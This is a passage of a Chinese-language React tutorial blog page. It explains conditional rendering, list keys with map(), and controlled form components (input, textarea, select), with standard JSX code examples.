class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginControl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">props</span>) &#123;<br>    <span class="hljs-variable language_">super</span>(props);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleLoginClick</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleLoginClick</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleLogoutClick</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleLogoutClick</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> = &#123;<span class="hljs-attr">isLoggedIn</span>: <span class="hljs-literal">false</span>&#125;;<br>  &#125;<br><br>  <span class="hljs-title function_">handleLoginClick</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123;<span class="hljs-attr">isLoggedIn</span>: <span class="hljs-literal">true</span>&#125;);<br>  &#125;<br><br>  <span class="hljs-title function_">handleLogoutClick</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123;<span class="hljs-attr">isLoggedIn</span>: <span class="hljs-literal">false</span>&#125;);<br>  &#125;<br><br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> isLoggedIn = <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">isLoggedIn</span>;<br>    <span class="hljs-keyword">let</span> button;<br>    <span class="hljs-keyword">if</span> (isLoggedIn) &#123;<br>      button = <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">LogoutButton</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;this.handleLogoutClick&#125;</span> /&gt;</span></span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      button = <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">LoginButton</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;this.handleLoginClick&#125;</span> /&gt;</span></span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> (<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Greeting</span> <span class="hljs-attr">isLoggedIn</span>=<span class="hljs-string">&#123;isLoggedIn&#125;</span> /&gt;</span></span><br><span class="language-xml">        &#123;button&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>    );<br>  &#125;<br>&#125;<br><br><span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">render</span>(<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">LoginControl</span> /&gt;</span></span>,<br>  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;root&#x27;</span>)<br>);<br></code></pre></td></tr></table></figure><p>也可以借助运算符&amp;&amp;</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Mailbox</span>(<span class="hljs-params">props</span>) &#123;<br>  <span class="hljs-keyword">const</span> unreadMessages = props.<span class="hljs-property">unreadMessages</span>;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml">      &#123;unreadMessages.length &gt; 0 &amp;&amp;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">          You have &#123;unreadMessages.length&#125; unread messages.</span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">      &#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-keyword">const</span> messages = [<span class="hljs-string">&#x27;React&#x27;</span>, <span class="hljs-string">&#x27;Re: React&#x27;</span>, <span class="hljs-string">&#x27;Re:Re: React&#x27;</span>];<br><span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">render</span>(<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Mailbox</span> <span class="hljs-attr">unreadMessages</span>=<span class="hljs-string">&#123;messages&#125;</span> /&gt;</span></span>,<br>  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;root&#x27;</span>)<br>);<br></code></pre></td></tr></table></figure><p>也可以借助三目运算符</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> isLoggedIn = <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">isLoggedIn</span>;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      &#123;isLoggedIn</span><br><span class="language-xml">        ? <span class="hljs-tag">&lt;<span class="hljs-name">LogoutButton</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;this.handleLogoutClick&#125;</span> /&gt;</span></span><br><span class="language-xml">        : <span class="hljs-tag">&lt;<span class="hljs-name">LoginButton</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;this.handleLoginClick&#125;</span> /&gt;</span></span><br><span class="language-xml">      &#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>阻止组件渲染：在极少数情况下，你可能希望能隐藏组件，即使它已经被其他组件渲染。若要完成此操作，你可以让 <code>render</code> 方法直接返回 <code>null</code>，而不进行任何渲染。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">if</span> (!props.<span class="hljs-property">warn</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="23-列表-amp-key"><a href="#23-列表-amp-key" class="headerlink" title="23. 列表 &amp; key"></a>23. 列表 &amp; key</h3><p>主要使用<code>map()</code>函数：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">NumberList</span>(<span class="hljs-params">props</span>) &#123;<br>  <span class="hljs-keyword">const</span> numbers = props.<span class="hljs-property">numbers</span>;<br>  <span class="hljs-keyword">const</span> listItems = numbers.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">number</span>) =&gt;</span><br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;number.toString()&#125;</span>&gt;</span></span><br><span class="language-xml">      &#123;number&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br>  );<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>&#123;listItems&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-keyword">const</span> numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];<br><span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">render</span>(<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">NumberList</span> <span class="hljs-attr">numbers</span>=<span class="hljs-string">&#123;numbers&#125;</span> /&gt;</span></span>,<br>  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;root&#x27;</span>)<br>);<br></code></pre></td></tr></table></figure><p>注意：</p><ol><li><p>key 帮助 React 识别哪些元素改变了，比如被添加或删除。因此应当&#x3D;&#x3D;给数组中的每一个元素赋予一个确定的标识&#x3D;&#x3D;，如上例使用<code>number.toString()</code>，也可以使用<code>number.id</code>。当元素没有确定 id 的时候，万不得已你可以使用元素索引 index 作为 key：<code>index</code>，但不建议，因为会导致性能变差，还可能引起组件状态的问题。</p></li><li><p>元素的 key 只有放在就近的数组上下文中才有意义。比方说，如果提取出一个 <code>ListItem</code> 组件，应该把 key 保留在数组中的这个 <code>&lt;ListItem /&gt;</code> 元素上，而不是放在 <code>ListItem</code> 组件中的 <code>&lt;li&gt;</code> 元素上。一个好的经验法则是：在 <code>map()</code> 方法中的元素需要设置 key 属性。</p></li><li><p>key只是在兄弟节点之间必须唯一，不需要是全局唯一，当生成两个不同的数组时，可以使用相同的key值。</p></li><li><p>key 会传递信息给 React ，但不会传递给你的组件。如果你的组件中需要使用 <code>key</code> 属性的值，请用其他属性名显式传递这个值：</p></li></ol><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">const</span> content = posts.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">post</span>) =&gt;</span><br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Post</span></span></span><br><span class="hljs-tag"><span class="language-xml">    <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;post.id&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">    <span class="hljs-attr">id</span>=<span class="hljs-string">&#123;post.id&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">    <span class="hljs-attr">title</span>=<span class="hljs-string">&#123;post.title&#125;</span> /&gt;</span></span><br>);<br></code></pre></td></tr></table></figure><p>上面例子中，<code>Post</code> 组件可以读出 <code>props.id</code>，但是不能读出 <code>props.key</code>。</p><p>JSX 允许在大括号中嵌入任何表达式，所以我们可以内联 <code>map()</code> 返回的结果：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">NumberList</span>(<span class="hljs-params">props</span>) &#123;<br>  <span class="hljs-keyword">const</span> numbers = props.<span class="hljs-property">numbers</span>;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">      &#123;numbers.map((number) =&gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">ListItem</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;number.toString()&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">                  <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;number&#125;</span> /&gt;</span></span><br><span class="language-xml">      )&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="24-表单"><a href="#24-表单" class="headerlink" title="24.表单"></a>24.表单</h3><p>在 React 里，HTML 表单元素的工作方式和其他的 DOM 元素有些不同，这是因为表单元素通常会保持一些内部的 state。例如这个纯 HTML 表单只接受一个名称：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jsx">&lt;form&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span></span><br><span class="language-xml">    名字:</span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> /&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span></span><br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span> /&gt;</span></span><br>&lt;/form&gt;<br></code></pre></td></tr></table></figure><p>此表单具有默认的 HTML 表单行为，即在用户提交表单后浏览到新页面。如果你在 React 中执行相同的代码，它依然有效。但大多数情况下，使用 JavaScript 函数可以很方便的处理表单的提交， 同时还可以访问用户填写的表单数据。实现这种效果的标准方式是使用&#x3D;&#x3D;受控组件&#x3D;&#x3D;。</p><p><strong>受控组件</strong></p><p>使 React 的 state 成为“唯一数据源”。渲染表单的 React 组件还控制着用户输入过程中表单发生的操作。被 React 以这种方式控制取值的表单输入元素就叫做“受控组件”。</p><p>例如，如果我们想在提交时打印出名称，我们可以将表单写为受控组件：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">class</span> <span class="hljs-title class_">NameForm</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">props</span>) &#123;<br>    <span class="hljs-variable language_">super</span>(props);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> = &#123;<span class="hljs-attr">value</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleChange</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleChange</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleSubmit</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleSubmit</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>);<br>  &#125;<br><br>  <span class="hljs-title function_">handleChange</span>(<span class="hljs-params">event</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123;<span class="hljs-attr">value</span>: event.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>&#125;);<br>  &#125;<br><br>  <span class="hljs-title function_">handleSubmit</span>(<span class="hljs-params">event</span>) &#123;<br>    <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;提交的名字: &#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">value</span>);<br>    event.<span class="hljs-title function_">preventDefault</span>();<br>  &#125;<br><br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> (<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">onSubmit</span>=<span class="hljs-string">&#123;this.handleSubmit&#125;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span></span><br><span class="language-xml">          名字:</span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;this.state.value&#125;</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;this.handleChange&#125;</span> /&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br>    );<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>由于在表单元素上设置了 <code>value</code> 属性，因此显示的值将始终为 <code>this.state.value</code>，这使得 React 的 state 成为唯一数据源。由于 <code>handlechange</code> 在每次按键时都会执行并更新 React 的 state，因此显示的值将随着用户输入而更新。</p><p>对于受控组件来说，输入的值始终由 React 的 state 驱动。你也可以将 value 传递给其他 UI 元素，或者通过其他事件处理函数重置，但这意味着你需要编写更多的代码。</p><p><strong>textarea标签</strong></p><p>在 React 中，<code>&lt;textarea&gt;</code> 使用 <code>value</code> 属性代替。使得使用 <code>&lt;textarea&gt;</code> 的表单和使用单行 input 的表单非常类似：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">class</span> <span class="hljs-title class_">EssayForm</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">props</span>) &#123;<br>    <span class="hljs-variable language_">super</span>(props);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> = &#123;      <span class="hljs-attr">value</span>: <span class="hljs-string">&#x27;请撰写一篇关于你喜欢的 DOM 元素的文章.&#x27;</span>    &#125;;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleChange</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleChange</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleSubmit</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleSubmit</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>);<br>  &#125;<br><br>  <span class="hljs-title function_">handleChange</span>(<span class="hljs-params">event</span>) &#123;    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123;<span class="hljs-attr">value</span>: event.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>&#125;);  &#125;<br>  <span class="hljs-title function_">handleSubmit</span>(<span class="hljs-params">event</span>) &#123;<br>    <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;提交的文章: &#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">value</span>);<br>    event.<span class="hljs-title function_">preventDefault</span>();<br>  &#125;<br><br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> (<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">onSubmit</span>=<span class="hljs-string">&#123;this.handleSubmit&#125;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span></span><br><span class="language-xml">          文章:</span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;this.state.value&#125;</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;this.handleChange&#125;</span> /&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br>    );<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>请注意，<code>this.state.value</code> 初始化于构造函数中，因此文本区域默认有初值。</p><p><strong>select标签</strong></p><p>React 并不会使用 <code>selected</code> 属性，而是在根 <code>select</code> 标签上使用 <code>value</code> 属性。这在受控组件中更便捷，因为您只需要在根标签中更新它。例如：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">class</span> <span class="hljs-title class_">FlavorForm</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">props</span>) &#123;<br>    <span class="hljs-variable language_">super</span>(props);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> = &#123;<span class="hljs-attr">value</span>: <span class="hljs-string">&#x27;coconut&#x27;</span>&#125;;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleChange</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleChange</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleSubmit</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleSubmit</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>);<br>  &#125;<br><br>  <span class="hljs-title function_">handleChange</span>(<span class="hljs-params">event</span>) &#123;    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123;<span class="hljs-attr">value</span>: event.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>&#125;);  &#125;<br>  <span class="hljs-title function_">handleSubmit</span>(<span class="hljs-params">event</span>) &#123;<br>    <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;你喜欢的风味是: &#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">value</span>);<br>    event.<span class="hljs-title function_">preventDefault</span>();<br>  &#125;<br><br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> (<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">onSubmit</span>=<span class="hljs-string">&#123;this.handleSubmit&#125;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span></span><br><span class="language-xml">          选择你喜欢的风味:</span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;this.state.value&#125;</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;this.handleChange&#125;</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;grapefruit&quot;</span>&gt;</span>葡萄柚<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;lime&quot;</span>&gt;</span>酸橙<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;coconut&quot;</span>&gt;</span>椰子<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;mango&quot;</span>&gt;</span>芒果<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br>    );<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>总的来说，这使得 <code>&lt;input type=&quot;text&quot;&gt;</code>, <code>&lt;textarea&gt;</code> 和 <code>&lt;select&gt;</code> 之类的标签都非常相似—它们都接受一个 <code>value</code> 属性，你可以使用它来实现受控组件。另外，<code>value</code>属性支持传入数组，可以在<code>select</code>标签中选择多个选项：<code>&lt;select multiple=&#123;true&#125; value=&#123;[&#39;B&#39;, &#39;C&#39;]&#125;&gt;</code>。</p><p><strong>文件input标签</strong></p><p><code>&lt;input type=&quot;file&quot;&gt;</code> 允许用户从存储设备中选择一个或多个文件，将其上传到服务器，或通过使用 JavaScript 的File API进行控制。</p><p>因为它的 value 只读，所以它是 React 中的一个&#x3D;&#x3D;非受控组件&#x3D;&#x3D;。将与其他非受控组件在后续文档中一起讨论。</p><p><strong>处理多个输入</strong></p><p>当需要处理多个 <code>input</code> 元素时，我们可以给每个元素添加 <code>name</code> 属性，并让处理函数根据 <code>event.target.name</code> 的值选择要执行的操作，例如：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 